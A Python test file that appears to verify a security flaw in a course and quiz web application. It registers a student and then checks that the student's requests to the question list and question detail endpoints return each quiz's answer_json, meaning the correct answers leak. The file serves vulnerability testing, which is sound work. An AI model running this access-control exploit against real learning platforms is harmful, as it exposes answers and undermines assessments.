import requests
from helpers import login, register, create_course, create_question, force_add_member_db, logout, get_user_id

def test_exploit_student_can_read_question_answer_json(app_instance):
    base_url = app_instance["base_url"]
    db_path = app_instance["db_path"]

    s = requests.Session()
    s.headers.update({"Accept": "application/json"})

    assert login(s, base_url, "admin", "admin123").status_code == 200
    course_id = create_course(s, base_url, "Quiz Leak", "demo").json()["course_id"]

    # make admin staff for this course (try admin role first)
    force_add_member_db(db_path, course_id, "admin", "admin")

    assert register(s, base_url, "student_q", "pass123", "StudentQ").status_code in (200, 201)
    force_add_member_db(db_path, course_id, "student_q", "student")

    # refresh session (in case role is cached)
    logout(s, base_url)
    assert login(s, base_url, "admin", "admin123").status_code == 200

    q = create_question(
        s, base_url, course_id,
        "single_choice", "2+2=?",
        ["3", "4", "5"],
        {"correct": "4"},
    )
    assert q.status_code in (200, 201), q.text
    question_id = q.json()["question_id"]

    logout(s, base_url)
    assert login(s, base_url, "student_q", "pass123").status_code == 200

    listed = s.get(f"{base_url}/api/courses/{course_id}/questions", timeout=5)
    assert listed.status_code == 200
    leaked = [x for x in listed.json()["questions"] if x["question_id"] == question_id][0]
    assert leaked.get("answer_json") is not None

    detail = s.get(f"{base_url}/api/courses/{course_id}/questions/{question_id}", timeout=5)
    assert detail.status_code == 200
    assert detail.json()["question"].get("answer_json") is not None